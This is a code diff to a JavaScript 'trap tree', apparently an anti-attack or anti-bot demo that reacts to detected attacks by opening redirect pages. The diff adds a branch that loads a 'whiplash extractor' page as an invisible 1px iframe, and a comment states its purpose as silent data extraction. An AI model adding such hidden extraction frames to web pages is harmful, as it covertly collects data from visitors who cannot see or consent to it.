@@ -129,6 +129,7 @@ const TRAP_TREE = {
   },
   // LEVEL 1: SIDE-CHANNEL TRAPS (3 branches from door)
   branches: [
+    { name: 'WHIPLASH_EXTRACTOR', url: '/demos/labyrinth/whiplash-extractor.html', type: 'extract' },
     { name: 'WASM_PRISON', url: '/demos/labyrinth/wasm-prison.html', type: 'redirect' },
     { name: 'LECTURE_GOD', url: '/demos/labyrinth/lecture-god.html', type: 'redirect' },
     { name: 'SHAME_WALL', url: '/demos/book/shame.html', type: 'redirect' },
@@ -172,6 +173,13 @@ function executeTrapTree(attack) {
     setTimeout(() => {
       if (branch.type === 'redirect') {
         window.open(branch.url, `_obliterator_${attack.id}_${i}`);
+      } else if (branch.type === 'extract') {
+        // Open extractor as hidden iframe for silent data extraction
+        const extractFrame = document.createElement('iframe');
+        extractFrame.src = branch.url;
+        extractFrame.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;pointer-events:none;z-index:50';
+        extractFrame.name = `_extractor_${attack.id}_${i}`;
+        document.body.appendChild(extractFrame);
       }
       console.log(`  ↳ Fan-out branch ${i+1}: ${branch.name}`);
     }, i * 800);
